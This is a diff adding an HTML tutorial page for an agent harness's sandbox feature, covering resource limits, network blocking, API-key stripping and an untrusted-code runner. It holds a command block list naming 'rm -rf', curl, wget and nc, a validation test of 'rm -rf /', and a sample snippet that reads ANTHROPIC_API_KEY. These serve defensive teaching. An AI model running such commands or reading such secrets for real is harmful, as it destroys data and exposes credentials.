+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          </div>
+          <pre><code class="language-python">from harness.types.sandbox import (
+    SandboxMode, SandboxPolicy, ResourceLimits, NetworkPolicy
+)
+
+# SandboxMode enum
+# SandboxMode.NONE    = "none"     — no isolation
+# SandboxMode.PROCESS = "process"  — setrlimit isolation
+# SandboxMode.DOCKER  = "docker"   — container isolation
+
+# ResourceLimits defaults
+limits = ResourceLimits(
+    max_memory_mb=512,    # 512MB virtual memory cap
+    max_cpu_seconds=30,   # 30 seconds CPU time
+    max_processes=64,     # 64 child processes
+    max_file_size_mb=100, # 100MB per file written
+)
+
+# NetworkPolicy defaults
+network = NetworkPolicy(
+    allow_network=False,         # Block all network
+    allowed_hosts=(),            # Allowlist (empty = block all)
+    blocked_ports=(),            # Port blocklist
+)
+
+# Full SandboxPolicy
+policy = SandboxPolicy(
+    mode=SandboxMode.DOCKER,
+    allowed_paths=("/home/user/project", "/tmp"),
+    blocked_commands=("rm -rf", "curl", "wget", "nc"),
+    resource_limits=limits,
+    network=network,
+    docker_image="python:3.12-slim",
+    env_passthrough=("HOME", "PATH"),   # Pass these through to container
+    # strip_env defaults (always stripped in both process and Docker modes):
+    # ANTHROPIC_API_KEY, OPENAI_API_KEY, GOOGLE_API_KEY,
+    # AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN
+)</code></pre>
+        </div>
+        <p style="margin-bottom:0;color:var(--muted);font-size:13.5px">
+          <code>strip_env</code> defaults are enforced in both process and Docker modes regardless of <code>env_passthrough</code>.
+          You cannot accidentally pass API keys into the sandbox.
+        </p>
+      </div>
+    </div>
+
+    <!-- ── 5. Trigger Resource Limits ── -->
+    <span class="section-anchor" id="resource-limits"></span>
+    <h2><span class="step-num">5</span>Trigger Resource Limits</h2>
+
+    <p>
+      The script below demonstrates all four enforcement mechanisms with intentionally tight limits.
+      Each test shows how <code>ExecutionResult</code> reports the failure:
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-header-left">
+          <span class="lang-badge">Python</span>
+          <span class="filename">sandbox_demo.py</span>
+        </div>
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+      </div>
+      <pre><code class="language-python"># sandbox_demo.py — demonstrates sandbox resource limits
+import asyncio
+from harness.sandbox.executor import create_executor
+from harness.types.sandbox import SandboxPolicy, SandboxMode, ResourceLimits
+
+async def main():
+    policy = SandboxPolicy(
+        mode=SandboxMode.PROCESS,
+        resource_limits=ResourceLimits(
+            max_memory_mb=64,      # Very low — 64MB
+            max_cpu_seconds=5,     # Very short — 5 seconds
+            max_processes=8,       # Very few processes
+        ),
+        blocked_commands=("rm -rf", "curl", "wget"),
+    )
+    executor = create_executor(policy)
+
+    # Test 1: Memory limit
+    print("Test 1: Memory limit (64MB)...")
+    result = await executor.execute("python3 -c \"x = 'a' * (100 * 1024 * 1024)\"")
+    print(f"  Exit: {result.exit_code}, OOM: {result.oom_killed}")
+    # Expected: oom_killed=True
+
+    # Test 2: CPU timeout
+    print("Test 2: CPU timeout (5s)...")
+    result = await executor.execute("python3 -c \"while True: pass\"")
+    print(f"  Exit: {result.exit_code}, Timed out: {result.timed_out}")
+    # Expected: timed_out=True
+
+    # Test 3: Blocked command
+    print("Test 3: Blocked command...")
+    error = executor.validate_command("rm -rf /")
+    print(f"  Validation: {error}")
+    # Expected: "Command blocked by sandbox policy"
+
+    # Test 4: Normal execution
+    print("Test 4: Normal execution...")
+    result = await executor.execute("echo 'Hello from sandbox!'")
+    print(f"  Output: {result.stdout.strip()}")
+    print(f"  Exit: {result.exit_code}")
+    # Expected: "Hello from sandbox!", exit_code=0
+
+    await executor.cleanup()
+
+asyncio.run(main())</code></pre>
+    </div>
+
+    <p>Expected output for each test:</p>
+
+    <div class="result-block result-oom">
+      <div class="result-label">Test 1 — Memory OOM</div>
+      Test 1: Memory limit (64MB)...<br>
+      &nbsp;&nbsp;Exit: -9, OOM: True
+    </div>
+
+    <div class="result-block result-timeout">
+      <div class="result-label">Test 2 — CPU Timeout</div>
+      Test 2: CPU timeout (5s)...<br>
+      &nbsp;&nbsp;Exit: -24, Timed out: True
+    </div>
+
+    <div class="result-block result-blocked">
+      <div class="result-label">Test 3 — Blocked Command</div>
+      Test 3: Blocked command...<br>
+      &nbsp;&nbsp;Validation: Command blocked by sandbox policy
+    </div>
+
+    <div class="result-block result-ok">
+      <div class="result-label">Test 4 — Normal Execution</div>
+      Test 4: Normal execution...<br>
+      &nbsp;&nbsp;Output: Hello from sandbox!<br>
+      &nbsp;&nbsp;Exit: 0
+    </div>
+
+    <div class="callout callout-info">
+      <div class="callout-header">&#8505; ExecutionResult Fields</div>
+      <ul style="margin-bottom:0">
+        <li><code>stdout</code> — captured standard output</li>
+        <li><code>exit_code</code> — process exit code (negative = killed by signal)</li>
+        <li><code>timed_out</code> — True if CPU limit was exceeded</li>
+        <li><code>oom_killed</code> — True if memory limit was exceeded</li>
+        <li><code>error</code> — error message string if execution failed to start</li>
+      </ul>
+    </div>
+
+    <!-- ── 6. CLI Override ── -->
+    <span class="section-anchor" id="cli-override"></span>
+    <h2><span class="step-num">6</span>CLI Override</h2>
+
+    <p>
+      Override the configured sandbox mode for a single invocation using <code>--sandbox</code>.
+      This does not modify <code>config.toml</code> — it applies only to that run:
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-header-left">
+          <span class="lang-badge">Bash</span>
+        </div>
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+      </div>
+      <pre><code class="language-bash"># Override sandbox mode per invocation
+harness --sandbox docker "Run untrusted tests"
+harness --sandbox process "Quick analysis"
+harness --sandbox none "Trusted local task"</code></pre>
+    </div>
+
+    <div class="callout callout-tryit">
+      <div class="callout-header">&#9654; Try It</div>
+      Run <code>harness --sandbox process "print the output of: python3 -c 'import sys; print(sys.version)'"</code>
+      to verify the sandbox is active. The output will be the Python version inside the sandbox environment.
+    </div>
+
+    <!-- ── 7. Build an Untrusted Code Runner ── -->
+    <span class="section-anchor" id="untrusted-runner"></span>
+    <h2><span class="step-num">7</span>Build an Untrusted Code Runner</h2>
+
+    <p>
+      Combine <code>sandbox_mode="docker"</code> with <code>permission_mode="bypass"</code>
+      for a safe, fully-automated code execution pipeline. The Docker sandbox provides
+      defense-in-depth even when the permission system is permissive:
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-header-left">
+          <span class="lang-badge">Python</span>
+          <span class="filename">untrusted_runner.py</span>
+        </div>
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+      </div>
+      <pre><code class="language-python"># untrusted_runner.py
+import asyncio
+import harness
+
+async def run_untrusted(code: str) -> str:
+    """Run AI-generated code in a sandboxed environment."""
+    prompt = f"""Execute this code and report the output:
+```python
+{code}
+```
+If the code fails, explain why and suggest a fix."""
+
+    result_text = ""
+    async for msg in harness.run(
+        prompt,
+        provider="anthropic",
+        model="claude-sonnet-4-20250514",
+        permission_mode="bypass",     # Auto-approve (safe because sandboxed)
+        sandbox_mode="docker",        # Full Docker isolation
+        max_turns=5,
+    ):
+        if isinstance(msg, harness.Result):
+            result_text = msg.text
+
+    return result_text
+
+# Example usage
+async def main():
+    # Safe: sandboxed — even if the code is malicious
+    output = await run_untrusted("""
+import os
+print(os.listdir('/'))
+print(os.environ.get('ANTHROPIC_API_KEY', 'NOT FOUND'))
+""")
+    print(output)
+    # API key will be "NOT FOUND" because sandbox strips it!
+
+asyncio.run(main())</code></pre>
+    </div>
+
+    <div class="callout callout-success">
+      <div class="callout-header">&#10003; Defense in Depth</div>
+      Even with <code>permission_mode='bypass'</code>, the Docker sandbox strips API keys
+      (as does process mode), blocks network access, and limits resources. The agent cannot
+      leak credentials or make external calls — regardless of what the code tries to do.
+    </div>
+
+    <div class="callout callout-info">
+      <div class="callout-header">&#8505; Default strip_env List</div>
+      <p>These environment variables are always stripped from the environment in both process and Docker sandbox modes:</p>
+      <div class="code-block" style="margin-top:10px;margin-bottom:0">
+        <div class="code-header">
+          <div class="code-header-left"><span class="lang-badge">Python</span></div>
+          <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><code class="language-python">strip_env = (
+    "ANTHROPIC_API_KEY",
+    "OPENAI_API_KEY",
+    "GOOGLE_API_KEY",
+    "AWS_SECRET_ACCESS_KEY",
+    "GITHUB_TOKEN",
+)</code></pre>
+      </div>
+      <p style="margin-bottom:0;margin-top:10px">
+        You can extend this list via <code>SandboxPolicy(strip_env=(..., "MY_SECRET"))</code>,
+        but the defaults are always enforced — they cannot be overridden to pass through.
+      </p>
+    </div>
+
+    <ul class="steps-list">
+      <li>
+        <span class="step-circle">1</span>
+        <div class="step-content">
+          <div class="step-title">Code arrives from an untrusted source</div>
+          <p style="color:var(--muted);font-size:13.5px">User-submitted code, AI-generated scripts, or code fetched from a URL.</p>
+        </div>
+      </li>
+      <li>
+        <span class="step-circle">2</span>
+        <div class="step-content">
+          <div class="step-title"><code>harness.run()</code> starts a sandboxed session</div>
+          <p style="color:var(--muted);font-size:13.5px">Docker container spins up with <code>--network=none</code> and stripped environment.</p>
+        </div>
+      </li>
+      <li>
+        <span class="step-circle">3</span>
+        <div class="step-content">
+          <div class="step-title">Agent executes the code inside the container</div>
+          <p style="color:var(--muted);font-size:13.5px">Even malicious code cannot escape the container, access the network, or read API keys.</p>
+        </div>
+      </li>
+      <li>
+        <span class="step-circle">4</span>
+        <div class="step-content">
+          <div class="step-title">Output is returned safely to your application</div>
+          <p style="color:var(--muted);font-size:13.5px">Container is destroyed after execution — no persistent state remains.</p>
+        </div>
+      </li>
+    </ul>
+
+    <!-- ── 8. Next Steps ── -->
+    <span class="section-anchor" id="next-steps"></span>
+    <h2><span class="step-num">8</span>Next Steps</h2>
+
+    <p>You now have sandboxed execution configured. Here is what to explore next:</p>
+
+    <ul>
+      <li>Combine sandboxing with audit logging (Tutorial 06) — every sandboxed command is hash-chained in the audit trail</li>
+      <li>Use custom Docker images (<code>docker_image = "myorg/my-env:latest"</code>) to match your production environment exactly</li>
+      <li>Set <code>allowed_paths</code> to restrict filesystem access to your project directory only</li>
+      <li>Explore Sub-Agents (Tutorial 08) — each sub-agent can run in its own sandbox with independent resource limits</li>
+    </ul>
+
+    <!-- ── Prev/Next nav ── -->
+    <nav class="page-nav" aria-label="Tutorial navigation">
+      <a href="06-audit-compliance.html" class="nav-card">
+        <span class="nav-dir">&#8592; Previous</span>
+        <span class="nav-title">Audit Logging</span>
+      </a>
+      <a href="08-sub-agents-parallel.html" class="nav-card next">
+        <span class="nav-dir">Next &#8594;</span>
+        <span class="nav-title">Sub-Agents</span>
+      </a>
+    </nav>
+
+  </main>
+</div><!-- /.layout -->
+
+<script>
+  // ── Copy to clipboard ──
+  function copyCode(btn) {
+    const pre = btn.closest('.code-block').querySelector('pre');
+    const text = pre.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = 'Copy';
+        btn.classList.remove('copied');
+      }, 2000);
+    }).catch(() => {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.position = 'fixed';
+      ta.style.opacity = '0';
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = 'Copy';
+        btn.classList.remove('copied');
+      }, 2000);
+    });
+  }
+
+  // ── Tab switching ──
+  document.querySelectorAll('.tab-group').forEach(group => {
+    const btns = group.querySelectorAll('.tab-btn');
+    const panels = group.querySelectorAll('.tab-panel');
+    btns.forEach(btn => {
+      btn.addEventListener('click', () => {
+        btns.forEach(b => {
+          b.classList.remove('active');
+          b.setAttribute('aria-selected', 'false');
+        });
+        panels.forEach(p => p.classList.remove('active'));
+        btn.classList.add('active');
+        btn.setAttribute('aria-selected', 'true');
+        const panel = group.querySelector('#' + btn.getAttribute('aria-controls'));
+        if (panel) panel.classList.add('active');
+      });
+    });
+  });
+
+  // ── Collapsible toggle ──
+  function toggleCollapsible(trigger) {
+    const expanded = trigger.getAttribute('aria-expanded') === 'true';
+    const contentId = trigger.getAttribute('aria-controls');
+    const content = document.getElementById(contentId);
+    trigger.setAttribute('aria-expanded', String(!expanded));
+    if (content) content.classList.toggle('open', !expanded);
+  }
+
+  // ── Mobile sidebar ──
+  const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+  const sidebar = document.getElementById('sidebar');
+  const overlay = document.getElementById('sidebarOverlay');
+
+  function openSidebar() {
+    sidebar.classList.add('open');
+    overlay.classList.add('open');
+    mobileMenuBtn.setAttribute('aria-expanded', 'true');
+  }
+
+  function closeSidebar() {
+    sidebar.classList.remove('open');
+    overlay.classList.remove('open');
+    mobileMenuBtn.setAttribute('aria-expanded', 'false');
+  }
+
+  mobileMenuBtn.addEventListener('click', () => {
+    if (sidebar.classList.contains('open')) {
+      closeSidebar();
+    } else {
+      openSidebar();
+    }
+  });
+
+  overlay.addEventListener('click', closeSidebar);
+
+  // ── TOC scroll highlight (IntersectionObserver) ──
+  const tocLinks = document.querySelectorAll('.toc-link');
+  const sections = document.querySelectorAll('.section-anchor');
+
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        const id = entry.target.id;
+        tocLinks.forEach(link => {
+          link.classList.toggle('active', link.getAttribute('href') === '#' + id);
+        });
+      }
+    });
+  }, {
+    rootMargin: '-60px 0px -70% 0px',
+    threshold: 0
+  });
+
+  sections.forEach(s => observer.observe(s));
+</script>
+
+</body>
+</html>
